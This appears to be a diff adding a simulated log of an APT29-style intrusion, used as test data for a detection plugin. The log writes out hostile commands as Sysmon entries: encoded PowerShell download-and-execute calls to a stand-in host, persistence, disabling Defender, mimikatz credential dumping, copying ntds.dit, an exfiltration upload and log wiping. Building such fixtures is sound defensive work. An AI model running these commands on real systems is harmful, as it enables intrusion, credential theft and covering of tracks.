@@ -1,0 +1,90 @@
+# ══════════════════════════════════════════════════════════════════
+# SIMULATED LOG — APT29 (Cozy Bear / The Dukes) Campaign
+# Scenario: Spearphishing → PowerShell → Persistence → C2 → Exfil
+# For testing PredictiveAttackPath plugin
+# ══════════════════════════════════════════════════════════════════
+
+[2025-06-15T08:23:11Z] SMTP-GW email-gateway-01: Inbound message from external sender threat-actor@spoofed-domain.com to target-user@corp.local
+[2025-06-15T08:23:11Z] SMTP-GW: Attachment detected: Q2_Financial_Review.docm (macro-enabled document)
+[2025-06-15T08:23:12Z] SMTP-GW: SPF check PASS, DKIM check FAIL — spearphishing attachment suspected
+[2025-06-15T08:23:45Z] Endpoint WKS-PC0142: User target-user opened attachment Q2_Financial_Review.docm
+[2025-06-15T08:23:46Z] Endpoint WKS-PC0142: WINWORD.EXE spawned child process: enabled content — macro execution detected
+[2025-06-15T08:23:47Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    ParentImage: C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE
+    Image: C:\Windows\System32\cmd.exe /c powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA
+[2025-06-15T08:23:48Z] Sysmon EventID=1 WKS-PC0142: powershell.exe -enc BASE64STRING -ep bypass -windowstyle hidden
+[2025-06-15T08:23:48Z] PowerShell ScriptBlock Logging EventID=4104:
+    IEX (New-Object Net.WebClient).DownloadString('https://cdn-update.example.com/payload')
+[2025-06-15T08:23:49Z] DNS Query: WKS-PC0142 → cdn-update.example.com → 185.174.xxx.xxx (newly registered domain, age: 3 days)
+[2025-06-15T08:23:50Z] Firewall: ALLOW TCP WKS-PC0142:49832 → 185.174.xxx.xxx:443 (HTTPS outbound)
+[2025-06-15T08:23:52Z] Sysmon EventID=3 WKS-PC0142: Network Connection
+    Image: powershell.exe → 185.174.xxx.xxx:443 (cobalt strike beacon callback)
+[2025-06-15T08:24:10Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\whoami.exe
+    CommandLine: whoami /all
+[2025-06-15T08:24:11Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\systeminfo.exe
+    CommandLine: systeminfo
+[2025-06-15T08:24:15Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\ipconfig.exe
+    CommandLine: ipconfig /all
+[2025-06-15T08:24:18Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\net.exe
+    CommandLine: net user /domain
+[2025-06-15T08:24:22Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\net.exe
+    CommandLine: net group "Domain Admins" /domain
+[2025-06-15T08:24:30Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\nltest.exe
+    CommandLine: nltest /domain_trusts /all_trusts
+[2025-06-15T08:25:00Z] Sysmon EventID=13 WKS-PC0142: Registry Value Set
+    TargetObject: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCheck
+    Details: "powershell.exe -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://cdn-update.example.com/persist')\""
+[2025-06-15T08:25:05Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\schtasks.exe
+    CommandLine: schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\UpdateCheck" /tr "powershell.exe -w hidden -enc ..." /sc DAILY /st 09:00
+[2025-06-15T08:30:00Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\rundll32.exe
+    CommandLine: rundll32.exe C:\Users\target-user\AppData\Local\Temp\update.dll,StartW
+[2025-06-15T08:31:00Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\cmd.exe
+    CommandLine: cmd.exe /c wmic process list brief
+[2025-06-15T08:31:30Z] Sysmon EventID=1 WKS-PC0142: tasklist /v
+[2025-06-15T08:31:45Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\net.exe
+    CommandLine: net share
+[2025-06-15T08:32:00Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    CommandLine: Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled
+[2025-06-15T08:32:30Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    CommandLine: Set-MpPreference -DisableRealtimeMonitoring $true
+[2025-06-15T08:33:00Z] Windows Defender: Real-time protection turned OFF by user CORP\target-user
+[2025-06-15T08:35:00Z] Sysmon EventID=10 WKS-PC0142: Process Access
+    SourceImage: C:\Users\target-user\AppData\Local\Temp\update.dll → lsass.exe
+    GrantedAccess: 0x1010 (credential dump — mimikatz sekurlsa::logonpasswords)
+[2025-06-15T08:35:05Z] Security EventID=4624 WKS-PC0142: Logon Type 9 (NewCredentials)
+    mimikatz # sekurlsa::logonpasswords
+    Username: CORP\admin-user  NTLM: aad3b435b51404eeaad3b435b51404ee
+[2025-06-15T08:40:00Z] Security EventID=4624 DC01: Logon Type 3 (Network)
+    Source: WKS-PC0142  Account: CORP\admin-user (pass the hash detected)
+[2025-06-15T08:40:10Z] Sysmon EventID=1 DC01: Process Create
+    CommandLine: net use \\DC01\C$ /user:CORP\admin-user
+[2025-06-15T08:40:30Z] Sysmon EventID=11 DC01: File Create
+    TargetFilename: C:\Windows\Temp\svc_update.exe (lateral tool transfer)
+[2025-06-15T08:45:00Z] Sysmon EventID=1 DC01: Process Create
+    Image: C:\Windows\System32\cmd.exe
+    CommandLine: ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\ntds_dump" quit quit
+[2025-06-15T08:45:30Z] Sysmon EventID=1 DC01: vssadmin create shadow /for=C:
+[2025-06-15T08:46:00Z] Sysmon EventID=11 DC01: copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
+[2025-06-15T08:50:00Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    CommandLine: Compress-Archive -Path C:\Windows\Temp\ntds_dump -DestinationPath C:\Users\target-user\Documents\report_q2.zip
+[2025-06-15T08:51:00Z] Proxy-Log: WKS-PC0142 → POST https://cdn-update.example.com/upload (2.3 GB upload over HTTPS — exfiltration over C2 channel)
+[2025-06-15T08:55:00Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    CommandLine: wevtutil cl Security
+[2025-06-15T08:55:01Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    CommandLine: wevtutil cl System
+[2025-06-15T08:55:02Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    CommandLine: wevtutil cl Application
+[2025-06-15T08:55:10Z] Sysmon EventID=1 WKS-PC0142: Process Create
+    CommandLine: Remove-Item -Path "C:\Users\target-user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
